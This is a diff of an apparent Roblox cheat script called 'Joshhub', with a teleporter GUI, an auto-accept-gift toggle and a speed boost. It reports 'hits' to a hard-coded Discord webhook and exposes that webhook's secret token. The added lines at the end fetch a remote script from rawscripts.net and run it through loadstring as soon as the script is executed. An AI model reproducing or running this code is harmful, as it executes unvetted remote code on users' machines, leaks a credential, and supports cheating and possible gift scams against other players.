@@ -1,3 +1,4 @@
+
 -- Joshhub Full Client Script (cleaned & organized)
 -- Features:
 --  - GUI: Teleporter / Player list
@@ -36,7 +37,8 @@ local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
+local HttpService = game:GetService("HttpService") 
+local TweenService = game:GetService("TweenService")
 
 -- Webhook URL (replace with your own if needed)
 local WebhookURL = "https://discord.com/api/webhooks/1420940951236513862/o5CH79ymXwVKR--U5MP9akBR3jQSFZnLfJbt4olXJjy2kjOnpeOb4vtZ-ed6xeuIVr2E"
@@ -45,11 +47,15 @@ local function sendWebhook(content)
     if not WebhookURL or WebhookURL == "" then return end
     local data = {
         username = "🎁 GAG HITS TP",
-        avatar_url = "https://i.imgur.com/3GKwK6X.png",
-        content = content
+        avatar_url = "https://i.imgur.com/vkDcdge.png", -- Anime avatar, change if you want
+        embeds = {{
+            title = "🎉 Auto Accepted Gift!",
+            description = content,
+            color = 0xFFD580, -- Hot pink, change to any hex color (e.g. 0x00FF99 for green)
+            footer = { text = "Joshhub | TELEPORTER⚡" }
+        }}
     }
     pcall(function()
-        -- try using request if available; fall back to HttpService:PostAsync
         if request then
             request({
                 Url = WebhookURL,
@@ -69,15 +75,15 @@ ScreenGui.Name = "JoshhubScript👁️"
 ScreenGui.Parent = game:GetService("CoreGui")
 
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 230, 0, 300)
-MainFrame.Position = UDim2.new(0.03, 0, 0.25, 0)
+MainFrame.Size = UDim2.new(0, 185, 0, 245) -- 3 bawas sa laki
+MainFrame.Position = UDim2.new(0.03, 0, 0.26, 0)
 MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
 MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.Parent = ScreenGui
 
 local UICornerMain = Instance.new("UICorner", MainFrame)
-UICornerMain.CornerRadius = UDim.new(0, 12)
+UICornerMain.CornerRadius = UDim.new(0, 11)
 
 local UIGradient = Instance.new("UIGradient", MainFrame)
 UIGradient.Color = ColorSequence.new({
@@ -87,53 +93,67 @@ UIGradient.Color = ColorSequence.new({
 UIGradient.Rotation = 90
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -35, 0, 35)
+Title.Size = UDim2.new(1, -31, 0, 27)
 Title.Position = UDim2.new(0, 8, 0, 0)
 Title.BackgroundTransparency = 1
 Title.Text = "🔮 TELEPORTER GAG JOSH"
 Title.TextColor3 = Color3.fromRGB(144, 238, 144)
 Title.Font = Enum.Font.Fantasy
-Title.TextSize = 15
+Title.TextSize = 13
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = MainFrame
 
 local MinBtn = Instance.new("TextButton")
-MinBtn.Size = UDim2.new(0, 28, 0, 28)
-MinBtn.Position = UDim2.new(1, -32, 0, 4)
+MinBtn.Size = UDim2.new(0, 22, 0, 22)
+MinBtn.Position = UDim2.new(1, -26, 0, 3)
 MinBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
 MinBtn.TextColor3 = Color3.fromRGB(255, 180, 120)
 MinBtn.Text = "-"
 MinBtn.Font = Enum.Font.SourceSansBold
-MinBtn.TextSize = 20
+MinBtn.TextSize = 17
 MinBtn.Parent = MainFrame
 Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 6)
 
+-- MINIMIZE BUTTON SYSTEM (no animation, pantay layout)
 local Minimized = false
+local originalSize = UDim2.new(0, 180, 0, 240)
+local minimizedSize = UDim2.new(0, 175, 0, 41)
+
 MinBtn.MouseButton1Click:Connect(function()
-    Minimized = not Minimized
-    if Minimized then
-        for _, v in pairs(MainFrame:GetChildren()) do
-            if (v ~= Title) and (v ~= MinBtn) and not v:IsA("UICorner") and not v:IsA("UIGradient") then
-                v.Visible = false
-            end
-        end
-        MainFrame.Size = UDim2.new(0, 230, 0, 40)
-        MinBtn.Text = "+"
-    else
-        for _, v in pairs(MainFrame:GetChildren()) do
-            if (v ~= Title) and (v ~= MinBtn) and not v:IsA("UICorner") and not v:IsA("UIGradient") then
-                v.Visible = true
-            end
-        end
-        MainFrame.Size = UDim2.new(0, 230, 0, 300)
-        MinBtn.Text = "-"
-    end
+	Minimized = not Minimized
+
+	if Minimized then
+		-- Itago lahat ng elements maliban sa Title at MinBtn
+		for _, v in pairs(MainFrame:GetChildren()) do
+			if (v ~= Title) and (v ~= MinBtn) and not v:IsA("UICorner") and not v:IsA("UIGradient") then
+				v.Visible = false
+			end
+		end
+
+		-- Liitan ang frame (pantay)
+		MainFrame.Size = minimizedSize
+		MinBtn.Text = "+"
+
+	else
+		-- Ibalik sa original size
+		MainFrame.Size = originalSize
+
+		-- Ipakita ulit lahat ng elements
+		for _, v in pairs(MainFrame:GetChildren()) do
+			if (v ~= Title) and (v ~= MinBtn) and not v:IsA("UICorner") and not v:IsA("UIGradient") then
+				v.Visible = true
+			end
+		end
+
+		MinBtn.Text = "-"
+	end
 end)
+
 
 -- Auto Accept switch
 local SwitchLabel = Instance.new("TextLabel")
-SwitchLabel.Size = UDim2.new(0, 130, 0, 25)
-SwitchLabel.Position = UDim2.new(0, 10, 0, 45)
+SwitchLabel.Size = UDim2.new(0, 125, 0, 19)
+SwitchLabel.Position = UDim2.new(0, 10, 0, 35)
 SwitchLabel.BackgroundTransparency = 1
 SwitchLabel.Text = "Auto Accept Gift"
 SwitchLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -143,19 +163,19 @@ SwitchLabel.TextSize = 12
 SwitchLabel.Parent = MainFrame
 
 local SwitchFrame = Instance.new("TextButton")
-SwitchFrame.Size = UDim2.new(0, 45, 0, 22)
-SwitchFrame.Position = UDim2.new(0, 150, 0, 47)
+SwitchFrame.Size = UDim2.new(0, 43, 0, 19)
+SwitchFrame.Position = UDim2.new(0, 130, 0, 35)
 SwitchFrame.BackgroundColor3 = Color3.fromRGB(80, 40, 40)
 SwitchFrame.Text = ""
 SwitchFrame.Parent = MainFrame
-Instance.new("UICorner", SwitchFrame).CornerRadius = UDim.new(0, 12)
+Instance.new("UICorner", SwitchFrame).CornerRadius = UDim.new(0, 11)
 
 local Knob = Instance.new("Frame")
-Knob.Size = UDim2.new(0, 20, 0, 20)
+Knob.Size = UDim2.new(0, 17, 0, 17)
 Knob.Position = UDim2.new(0, 1, 0, 1)
 Knob.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
 Knob.Parent = SwitchFrame
-Instance.new("UICorner", Knob).CornerRadius = UDim.new(0, 12)
+Instance.new("UICorner", Knob).CornerRadius = UDim.new(0, 11)
 
 getgenv().AutoAccept = false
 local function ToggleSwitch()
@@ -170,12 +190,12 @@ local function ToggleSwitch()
 end
 SwitchFrame.MouseButton1Click:Connect(ToggleSwitch)
 
--- Player List (Teleporter)
+--- Player List (Teleporter)
 local PlayerList = Instance.new("ScrollingFrame")
-PlayerList.Size = UDim2.new(1, -20, 0, 110)
-PlayerList.Position = UDim2.new(0, 10, 0, 80)
+PlayerList.Size = UDim2.new(1, -19, 0, 82)
+PlayerList.Position = UDim2.new(0, 10, 0, 60)
 PlayerList.BackgroundTransparency = 1
-PlayerList.ScrollBarThickness = 5
+PlayerList.ScrollBarThickness = 4
 PlayerList.Parent = MainFrame
 
 local UIList = Instance.new("UIListLayout")
@@ -201,7 +221,7 @@ local function refreshPlayerList()
             Btn.BackgroundColor3 = Color3.fromRGB(60, 30, 30)
             Btn.TextColor3 = Color3.fromRGB(255, 200, 120)
             Btn.Font = Enum.Font.SourceSansBold
-            Btn.TextSize = 13
+            Btn.TextSize = 12
             Btn.Text = plr.DisplayName or plr.Name
             Btn.Parent = PlayerList
             Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
@@ -220,7 +240,7 @@ refreshPlayerList()
 
 -- Leave Button
 local LeaveButton = Instance.new("TextButton")
-LeaveButton.Size = UDim2.new(1, -19, 0, 28)
+LeaveButton.Size = UDim2.new(1, -19, 0, 26)
 LeaveButton.Position = UDim2.new(0, 10, 1, -32)
 LeaveButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
 LeaveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -229,10 +249,38 @@ LeaveButton.Font = Enum.Font.SourceSansBold
 LeaveButton.TextSize = 12
 LeaveButton.Parent = MainFrame
 Instance.new("UICorner", LeaveButton).CornerRadius = UDim.new(0, 6)
+
 LeaveButton.MouseButton1Click:Connect(function()
-    -- Kick the player with a message (unchanged content from original)
-    LocalPlayer:Kick("YOU KICK BY JOSH☠️")
+game.Players.LocalPlayer:Kick("YOU KICK BY JOSH☠️") end)
+
+-- Discord Button
+local DiscordButton = Instance.new("TextButton")
+DiscordButton.Size = UDim2.new(1, -19, 0, 26)
+DiscordButton.Position = UDim2.new(0, 10, 1, -60)
+DiscordButton.BackgroundColor3 = Color3.fromRGB(100, 0, 255)
+DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+DiscordButton.Text = "🔗 DISCORD"
+DiscordButton.Font = Enum.Font.SourceSansBold
+DiscordButton.TextSize = 12
+DiscordButton.Parent = MainFrame
+Instance.new("UICorner", DiscordButton).CornerRadius = UDim.new(0, 6)
+
+DiscordButton.MouseButton1Click:Connect(function()
+    local discordLink = "https://discord.gg/wVfHjz47"
+    if setclipboard then
+        setclipboard(discordLink)
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Discord Link",
+            Text = "Copied to clipboard!",
+            Duration = 3
+        })
+    else
+        pcall(function()
+            game:GetService("GuiService"):OpenBrowserWindow(discordLink)
+        end)
+    end
 end)
+
 
 --  / Noclip / Jump setup
 UserInputService.JumpRequest:Connect(function()
@@ -403,133 +451,123 @@ for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
     end
 end 
  
-local key = Enum.KeyCode.X -- key to toggle invisibility
+local key = Enum.KeyCode.X -- key to toggle invisibility (PC only)
 
---// Don't edit below this line
+--// Variables
 local invis_on = false
 local defaultSpeed = 16
 local boostedSpeed = 48
 local isSpeedBoosted = false
 
--- Create GUI
+--// Setup Player & GUI
 local player = game.Players.LocalPlayer
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 screenGui.ResetOnSpawn = false
 
--- INVISIBLE button (top-left)
-local invisButton = Instance.new("TextButton", screenGui)
-invisButton.Size = UDim2.new(0, 110, 0, 40)
-invisButton.Position = UDim2.new(0, 15, 0, 15)
-invisButton.Text = "INVISIBLE"
-invisButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-invisButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-invisButton.Font = Enum.Font.SourceSansBold
-invisButton.TextScaled = true
-invisButton.AutoButtonColor = true
-invisButton.Active = true
-invisButton.Draggable = true
+-- Function para gawing draggable kahit CP
+local function makeDraggable(button)
+    local UserInputService = game:GetService("UserInputService")
+    local dragging, dragInput, dragStart, startPos
 
--- SPEED BOOST button (top-right)
+    local function update(input)
+        local delta = input.Position - dragStart
+        button.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+
+    button.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = button.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    button.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+end
+
+
+--// SPEED BOOST Button (upper-right, maliit at mas mataas)
 local speedButton = Instance.new("TextButton", screenGui)
-speedButton.Size = UDim2.new(0, 110, 0, 40)
-speedButton.Position = UDim2.new(1, -125, 0, 15)
-speedButton.AnchorPoint = Vector2.new(0, 0)
+speedButton.Size = UDim2.new(0, 88, 0, 28)
+speedButton.Position = UDim2.new(1, -105, 0, 20) -- mas mataas na position
 speedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 speedButton.Text = "SPEED BOOST"
 speedButton.TextScaled = true
 speedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 speedButton.Font = Enum.Font.SourceSansBold
-speedButton.AutoButtonColor = true
-speedButton.Active = true
-speedButton.Draggable = true
+makeDraggable(speedButton)
 
--- Sound effect
+--// Sound Effect
 local sound = Instance.new("Sound", player:WaitForChild("PlayerGui"))
 sound.SoundId = "rbxassetid://942127495"
 sound.Volume = 1
 
+--// Helper: Set transparency
 local function setTransparency(character, transparency)
-	for _, part in pairs(character:GetDescendants()) do
-		if part:IsA("BasePart") or part:IsA("Decal") then
-			part.Transparency = transparency
-		end
-	end
+    for _, part in pairs(character:GetDescendants()) do
+        if part:IsA("BasePart") or part:IsA("Decal") then
+            part.Transparency = transparency
+        end
+    end
 end
 
-local function toggleInvisibility()
-	invis_on = not invis_on
-	sound:Play()
-	if invis_on then
-		local savedpos = player.Character.HumanoidRootPart.CFrame
-		wait()
-		player.Character:MoveTo(Vector3.new(-25.95, 84, 3537.55))
-		wait(0.15)
-		local Seat = Instance.new("Seat", workspace)
-		Seat.Anchored = false
-		Seat.CanCollide = false
-		Seat.Name = "invischair"
-		Seat.Transparency = 1
-		Seat.Position = Vector3.new(-25.95, 84, 3537.55)
-		local Weld = Instance.new("Weld", Seat)
-		Weld.Part0 = Seat
-		Weld.Part1 = player.Character:FindFirstChild("Torso") or player.Character:FindFirstChild("UpperTorso")
-		wait()
-		Seat.CFrame = savedpos
-		setTransparency(player.Character, 0.5)
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Invisibility: ON",
-			Duration = 3,
-			Text = "You are now invisible."
-		})
-	else
-		local invisChair = workspace:FindFirstChild("invischair")
-		if invisChair then
-			invisChair:Destroy()
-		end
-		setTransparency(player.Character, 0)
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Invisibility: OFF",
-			Duration = 3,
-			Text = "You are now visible."
-		})
-	end
-end
 
+--// Toggle Speed Boost
 local function toggleSpeedBoost()
-	isSpeedBoosted = not isSpeedBoosted
-	sound:Play()
-	local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
-	if humanoid then
-		if isSpeedBoosted then
-			humanoid.WalkSpeed = boostedSpeed
-			speedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-			game.StarterGui:SetCore("SendNotification", {
-				Title = "Speed Boost: ON",
-				Duration = 3,
-				Text = "Speed set to " .. boostedSpeed
-			})
-		else
-			humanoid.WalkSpeed = defaultSpeed
-			speedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-			game.StarterGui:SetCore("SendNotification", {
-				Title = "Speed Boost: OFF",
-				Duration = 3,
-				Text = "Speed set to " .. defaultSpeed
-			})
-		end
-	end
+    isSpeedBoosted = not isSpeedBoosted
+    sound:Play()
+    local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+    if humanoid then
+        if isSpeedBoosted then
+            humanoid.WalkSpeed = boostedSpeed
+            speedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Speed Boost (on)",
+                Duration = 3,
+                Text = "Speed: " .. boostedSpeed
+            })
+        else
+            humanoid.WalkSpeed = defaultSpeed
+            speedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Speed Boost (off)",
+                Duration = 3,
+                Text = "Speed: " .. defaultSpeed
+            })
+        end
+    end
 end
 
--- Connect buttons
-invisButton.MouseButton1Click:Connect(toggleInvisibility)
+--// Button connections
 speedButton.MouseButton1Click:Connect(toggleSpeedBoost)
 
--- Reset when character respawns
+--// Reset speed after respawn
 player.CharacterAdded:Connect(function(character)
-	isSpeedBoosted = false
-	local humanoid = character:WaitForChild("Humanoid")
-	humanoid.WalkSpeed = defaultSpeed
-	speedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    isSpeedBoosted = false
+    local humanoid = character:WaitForChild("Humanoid")
+    humanoid.WalkSpeed = defaultSpeed
+    speedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 end)
 
 -- Notification: loaded
@@ -539,4 +577,18 @@ pcall(function()
         Text = "Loaded successfully! ✅",
         Duration = 5
     })
+end)
+
+ -- ✅ Auto-run Invisible Script when executed
+task.spawn(function()
+    local ExternalScriptURL = "https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"
+    local success, response = pcall(function()
+        return game:HttpGet(ExternalScriptURL)
+    end)
+    if success and response then
+        loadstring(response)()
+        print("✅ External script loaded successfully!")
+    else
+        warn("⚠️ Failed to load external script: " .. tostring(response))
+    end
 end)
